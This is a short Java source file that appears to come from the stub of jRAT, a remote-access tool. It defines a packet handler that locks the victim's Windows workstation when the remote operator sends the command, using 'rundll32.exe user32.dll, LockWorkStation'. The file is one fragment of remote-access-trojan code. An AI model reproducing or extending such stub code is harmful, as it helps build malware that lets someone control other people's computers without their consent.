package su.jrat.stub.packets.incoming;

import su.jrat.common.OperatingSystem;

public class Packet32LockComputer extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("rundll32.exe user32.dll, LockWorkStation");
		}
	}

}